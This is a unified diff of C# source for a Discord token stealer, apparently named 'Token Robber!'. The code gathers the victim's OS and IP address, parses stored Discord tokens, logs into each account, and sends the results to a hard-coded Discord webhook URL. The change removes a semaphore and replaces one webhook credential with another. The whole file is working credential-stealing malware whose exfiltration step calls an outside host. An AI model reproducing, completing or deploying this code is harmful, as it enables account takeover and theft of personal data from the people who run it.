@@ -10,25 +10,17 @@ content.AppendLine($"Operating System: {Environment.OSVersion.Platform} ({(Envir
 content.AppendLine($"IP-Address: {await IpInfo.GetIPAddress()}");
 content.AppendLine("Token(s): ");
 
-var semaphore = new SemaphoreSlim(1, 1);
 var loggedUsers = new ConcurrentBag<string>();
-
 using var discordClient = new DiscordClient();
 await foreach (var token in TokenParser.ParseAsync())
 {
-    await semaphore.WaitAsync();
-    try
-    {
-        if (await discordClient.LoginAsync(token) is not { } discordUser || loggedUsers.Contains(discordUser.Id)) 
-            continue;
-        content.Append(discordUser);
-        loggedUsers.Add(discordUser.Id);
-    }
-    finally
-    {
-        semaphore.Release();
-    }
+    if (await discordClient.LoginAsync(token) is not { } discordUser || loggedUsers.Contains(discordUser.Id))
+        continue;
+    content.Append(discordUser.ToString());
+    loggedUsers.Add(discordUser.Id);
 }
 
-using var webhook = new DiscordWebhookClient("947227745136570409", "W-f1csQP6qyaHN9M4imQegmqaEe3hT-a0Bd508TCSvdpgMblpmXyU8vlVUfQpfiBL_2S");
-await webhook.SendMessage(new DiscordMessage(content.ToString(), "Token Robber!", "https://cdn.discordapp.com/emojis/889939729099943967.png?size=256"));
+var message = content.ToString();
+
+using var webhook = new DiscordWebhookClient("https://discord.com/api/webhooks/948319193005187142/MrCwuZJ1hOGAdwU1QucGn_rTl2xWXQlgR4t3ke9os1g-YMtgZuEazS92bL7X6tsDBHR6");
+await webhook.SendMessage(new DiscordMessage(message));
